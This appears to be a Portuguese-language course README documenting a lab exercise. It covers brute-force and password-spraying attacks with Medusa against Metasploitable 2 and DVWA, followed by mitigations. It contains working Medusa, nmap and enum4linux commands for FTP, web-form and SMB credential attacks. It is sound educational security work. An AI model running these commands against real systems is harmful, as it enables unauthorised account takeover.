# 🛡️ Ataques de Força Bruta com Medusa e Kali Linux — Laboratório Controlado

> Projeto prático do desafio **DIO** de Cibersegurança: simular, documentar e **aprender a mitigar** ataques de força bruta em um ambiente de laboratório **isolado e autorizado** (Kali Linux + Metasploitable 2 / DVWA).

![status](https://img.shields.io/badge/ambiente-laborat%C3%B3rio%20isolado-blue)
![status](https://img.shields.io/badge/uso-educacional%20autorizado-green)
![tool](https://img.shields.io/badge/ferramenta-Medusa-red)
![os](https://img.shields.io/badge/SO-Kali%20Linux-black)

---

## ⚠️ Aviso Legal e Ético

Todo o conteúdo deste repositório foi produzido em um **ambiente de laboratório fechado**, montado em máquinas virtuais com **rede interna/host-only** (sem acesso à internet e sem alcance a sistemas de terceiros).

- ✅ **Permitido:** testar sistemas que **você mesmo** configurou e controla, ou para os quais tem **autorização formal por escrito**.
- ❌ **Proibido:** usar estas técnicas contra qualquer sistema, serviço, rede ou conta sem autorização explícita. Isso é **crime** (no Brasil, enquadra-se na Lei 12.737/2012 — "Lei Carolina Dieckmann" — e correlatas).

O objetivo aqui é **defensivo e educacional**: entender como o ataque funciona para saber **como se proteger**.

---

## 📑 Índice

1. [Objetivos de Aprendizagem](#-objetivos-de-aprendizagem)
2. [Conceito: o que é força bruta](#-conceito-o-que-é-força-bruta)
3. [Arquitetura do Laboratório](#-arquitetura-do-laboratório)
4. [Configuração do Ambiente](#-configuração-do-ambiente-passo-a-passo)
5. [Reconhecimento com Nmap](#-reconhecimento-com-nmap)
6. [Cenário 1 — Força bruta em FTP](#-cenário-1--força-bruta-em-ftp)
7. [Cenário 2 — Formulário Web (DVWA)](#-cenário-2--formulário-web-dvwa)
8. [Cenário 3 — Password Spraying em SMB](#-cenário-3--password-spraying-em-smb)
9. [Wordlists](#-wordlists)
10. [Medidas de Mitigação](#-medidas-de-mitigação)
11. [Reflexões e Aprendizados](#-reflexões-e-aprendizados)
12. [Referências](#-referências)

---

## 🎯 Objetivos de Aprendizagem

- Compreender ataques de força bruta em diferentes serviços (**FTP, Web, SMB**).
- Utilizar **Kali Linux** e **Medusa** para auditoria de segurança em ambiente controlado.
- Documentar processos técnicos de forma **clara e estruturada**.
- Reconhecer vulnerabilidades comuns e **propor mitigações**.
- Usar o **GitHub como portfólio técnico**.

---

## 💡 Conceito: o que é força bruta

**Força bruta** é a tentativa sistemática de adivinhar uma credencial (senha, PIN, chave) testando muitas combinações até encontrar a correta. Variações importantes:

| Técnica | Descrição | Risco de bloqueio |
|---|---|---|
| **Força bruta pura** | Testa todas as combinações possíveis de caracteres | Alto (muitas tentativas) |
| **Ataque por dicionário** | Usa uma lista (wordlist) de senhas prováveis | Médio |
| **Credential stuffing** | Reutiliza pares usuário:senha vazados de outros serviços | Médio/Baixo |
| **Password spraying** | Testa **1 senha comum** contra **muitos usuários** | Baixo (evita bloqueio por conta) |

O **password spraying** é especialmente perigoso porque poucas tentativas por conta não disparam travas de bloqueio, mas atingem muitos alvos ao mesmo tempo.

### Por que o Medusa?
O [**Medusa**](http://www.foofus.net/jmk/medusa/medusa.html) é um brute-forcer **paralelo, modular e rápido**, com módulos para FTP, HTTP, SMB, SSH, MySQL e dezenas de outros protocolos. Alternativas comuns: **Hydra**, **Ncrack**, **Patator**.

Sintaxe geral:
```bash
medusa -h <ALVO> -U <arquivo_usuarios> -P <arquivo_senhas> -M <modulo> [opcoes]
```

| Flag | Significado |
|---|---|
| `-h` / `-H` | Host alvo / arquivo de hosts |
| `-u` / `-U` | Usuário único / arquivo de usuários |
| `-p` / `-P` | Senha única / arquivo de senhas |
| `-M` | Módulo do serviço (ftp, http, smbnt...) |
| `-t` | Nº de threads (conexões paralelas) |
| `-f` / `-F` | Para após o 1º sucesso (no host / global) |
| `-n` | Porta customizada |
| `-v` | Nível de verbosidade |

---

## 🏗️ Arquitetura do Laboratório

```
┌─────────────────────────────────────────────────────────┐
│                  VirtualBox (Host-Only)                   │
│                 Rede interna: 192.168.56.0/24             │
│                                                           │
│   ┌──────────────────┐          ┌──────────────────┐     │
│   │   KALI LINUX      │          │  METASPLOITABLE 2 │     │
│   │   (Atacante)      │  ─────▶  │   (Alvo/DVWA)     │     │
│   │  192.168.56.101   │          │  192.168.56.102   │     │
│   │                   │          │  FTP · HTTP · SMB │     │
│   └──────────────────┘          └──────────────────┘     │
│                                                           │
│          ❌ SEM acesso à internet / rede externa          │
└─────────────────────────────────────────────────────────┘
```

| VM | Papel | Credenciais padrão |
|---|---|---|
| **Kali Linux** | Máquina atacante (auditoria) | `kali` / `kali` |
| **Metasploitable 2** | Alvo intencionalmente vulnerável | `msfadmin` / `msfadmin` |

---

## ⚙️ Configuração do Ambiente (passo a passo)

### 1. Instalar o VirtualBox
Baixe em [virtualbox.org](https://www.virtualbox.org/) e instale.

### 2. Importar as VMs
- **Kali Linux:** baixe a imagem pré-configurada para VirtualBox em [kali.org/get-kali](https://www.kali.org/get-kali/).
- **Metasploitable 2:** baixe o `.zip`, extraia e adicione o `.vmdk` a uma nova VM (Linux 2.6/3.x 64-bit, sem disco novo — use o existente).

### 3. Criar a Rede Interna (Host-Only) — passo CRÍTICO
Para **isolar o laboratório** e nunca expor o Metasploitable (que é inseguro por natureza) à internet:

1. VirtualBox → **Arquivo → Ferramentas → Gerenciador de Rede → Host-Only**.
2. Crie o adaptador `vboxnet0` (ex.: `192.168.56.1/24`).
3. Em **cada VM** → Configurações → Rede → Adaptador 1 → **"Placa host-only"**.

> 💡 Mantenha o Metasploitable **somente** em host-only. Nunca em "Bridge" ou "NAT".

### 4. Verificar conectividade
```bash
# No Kali:
ip a                       # descobrir o IP do Kali (ex.: 192.168.56.101)
ping -c 3 192.168.56.102   # testar alcance ao Metasploitable
```

---

## 🔍 Reconhecimento com Nmap

Antes de qualquer teste de credencial, identifique **quais serviços estão abertos**:

```bash
# Varredura de serviços e versões no alvo
nmap -sV -p 21,80,139,445 192.168.56.102

# Varredura completa com scripts default
nmap -sC -sV 192.168.56.102 -oN scans/nmap_metasploitable.txt
```

Saída esperada (resumida):
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8  (DVWA)
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.X
```

> 📸 *Sugestão: salve a captura em `images/01-nmap.png`.*

---

## 🧪 Cenário 1 — Força bruta em FTP

O serviço **FTP (porta 21)** transmite credenciais em texto claro e, no Metasploitable, aceita múltiplas tentativas sem bloqueio.

### Comando
```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M ftp \
       -t 4 -f -v 4
```

### Explicação dos parâmetros
- `-h` alvo · `-U`/`-P` listas · `-M ftp` módulo FTP
- `-t 4` quatro conexões paralelas
- `-f` para no primeiro login válido encontrado
- `-v 4` verbosidade para acompanhar cada tentativa

### Resultado esperado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso
```bash
ftp 192.168.56.102
# Name: msfadmin   Password: msfadmin
ftp> ls
ftp> bye
```

> 📸 `images/02-ftp-medusa.png` · `images/03-ftp-login.png`

---

## 🌐 Cenário 2 — Formulário Web (DVWA)

O **DVWA** (Damn Vulnerable Web Application) roda no Apache do Metasploitable. O login é um formulário HTTP — então usamos o módulo `http` do Medusa (ou `web-form`).

### Preparação
1. Acesse `http://192.168.56.102/dvwa/` no navegador do Kali.
2. Login inicial DVWA: `admin` / `password`.
3. Em **DVWA Security**, defina o nível como **Low** (para o exercício).
4. Com as DevTools (F12 → Network), inspecione a requisição de login para capturar:
   - o **caminho** (ex.: `/dvwa/login.php`),
   - os **nomes dos campos** (`username`, `password`, `Login`),
   - a **mensagem de falha** (ex.: `Login failed`).

### Comando (módulo HTTP form POST)
```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M http \
       -m DIR:/dvwa/login.php \
       -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
       -m DENY-SIGNAL:"Login failed" \
       -t 2 -f -v 4
```

> ℹ️ A automação de formulários exige, geralmente, tratar o **token CSRF** e o **cookie de sessão** (`PHPSESSID`). Em níveis acima de *Low* o DVWA adiciona `user_token`, o que normalmente leva ao uso de ferramentas como **Hydra** (`http-post-form`), **Burp Suite Intruder** ou um **script Python** com `requests` que lê o token antes de cada tentativa. Veja [`scripts/dvwa_bruteforce.py`](scripts/dvwa_bruteforce.py).

> 📸 `images/04-dvwa-form.png`

---

## 📡 Cenário 3 — Password Spraying em SMB

Em vez de muitas senhas contra um usuário, testamos **uma senha comum contra vários usuários** — reduzindo o risco de bloqueio de conta.

### Passo 1 — Enumerar usuários
```bash
# enum4linux faz enumeração de contas/compartilhamentos via SMB
enum4linux -U 192.168.56.102

# alternativa moderna:
# enum4linux-ng -A 192.168.56.102
```
Anote os usuários encontrados (ex.: `msfadmin`, `user`, `service`, `postgres`) em `wordlists/users.txt`.

### Passo 2 — Spraying com Medusa (módulo smbnt)
```bash
# UMA senha contra TODOS os usuários enumerados
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -p "msfadmin" \
       -M smbnt \
       -t 1 -v 4
```

> Repita trocando a senha única (`-p`) por cada senha comum, com **pausa entre rodadas** para imitar um ataque realista de spraying e evitar travas.

### Validação
```bash
# Lista compartilhamentos usando a credencial encontrada
smbclient -L //192.168.56.102 -U msfadmin
```

> 📸 `images/05-enum4linux.png` · `images/06-smb-spray.png`

---

## 📝 Wordlists

Listas de exemplo (didáticas) estão em [`wordlists/`](wordlists/):

| Arquivo | Conteúdo |
|---|---|
| [`users.txt`](wordlists/users.txt) | Usuários comuns + enumerados no alvo |
| [`passwords.txt`](wordlists/passwords.txt) | Senhas fracas/comuns para demonstração |

No Kali, wordlists prontas e maiores ficam em:
```bash
ls /usr/share/wordlists/
zcat /usr/share/wordlists/rockyou.txt.gz | head    # clássica lista rockyou
```

---

## 🛡️ Medidas de Mitigação

O verdadeiro valor do exercício está **aqui**: cada ataque acima tem uma defesa correspondente.

### Contra força bruta (geral)
- **Senhas fortes e políticas de complexidade** — frustram ataques por dicionário.
- **MFA / 2FA** — mesmo com a senha correta, o atacante não entra.
- **Bloqueio progressivo / lockout** após N tentativas falhas (ex.: `fail2ban`).
- **Rate limiting e throttling** — atrasam cada tentativa.
- **CAPTCHA** em formulários web após falhas repetidas.
- **Monitoramento e alertas** de picos de autenticação falha (SIEM/logs).

### Por serviço

| Serviço | Mitigações específicas |
|---|---|
| **FTP** | Substituir por **SFTP/FTPS** (criptografado); desabilitar login anônimo; `fail2ban` com jail de vsftpd. |
| **Web (DVWA)** | Tokens **anti-CSRF**, rate limit por IP, CAPTCHA, cookies `HttpOnly`/`Secure`, bloqueio de conta, WAF. |
| **SMB** | Desabilitar **SMBv1**; exigir assinatura SMB; política de lockout do AD; segmentação de rede; `smb.conf` restritivo. |

### Exemplo prático — fail2ban para SSH/FTP
```ini
# /etc/fail2ban/jail.local
[sshd]
enabled  = true
maxretry = 4
bantime  = 1h
findtime = 10m
```

### Checklist defensivo rápido
- [ ] MFA habilitado em todos os serviços expostos
- [ ] Política de lockout configurada
- [ ] Protocolos legados (FTP, SMBv1, Telnet) desativados
- [ ] Logs centralizados e monitorados
- [ ] Senhas padrão **trocadas** (nunca `admin/admin`, `msfadmin/msfadmin`)

---

## 💭 Reflexões e Aprendizados

- **Credencial padrão é a porta mais fácil.** `msfadmin/msfadmin` caiu em segundos — reforçando que trocar senhas de fábrica é a primeira linha de defesa.
- **Força bruta é barulhenta.** Centenas de tentativas aparecem claramente nos logs — o que mostra o valor de **monitoramento** para detecção.
- **Password spraying é furtivo.** Poucas tentativas por conta driblam o lockout tradicional — por isso MFA e detecção por *comportamento* importam mais que só contar falhas.
- **Isolar o laboratório não é opcional.** O Metasploitable é propositalmente inseguro; expô-lo à rede seria um risco real.
- **Entender o ataque = defender melhor.** Cada comando testado virou uma recomendação de mitigação concreta.

---

## 📚 Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Documentação](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap — Manual Oficial](https://nmap.org/book/)
- [Metasploitable 2 — Guia de Exploração (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP — Credential Stuffing Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)

---

<div align="center">

**Projeto desenvolvido para o desafio de Cibersegurança da [DIO](https://www.dio.me/)**
🔒 *Conhecimento ofensivo a serviço da defesa.*

</div>
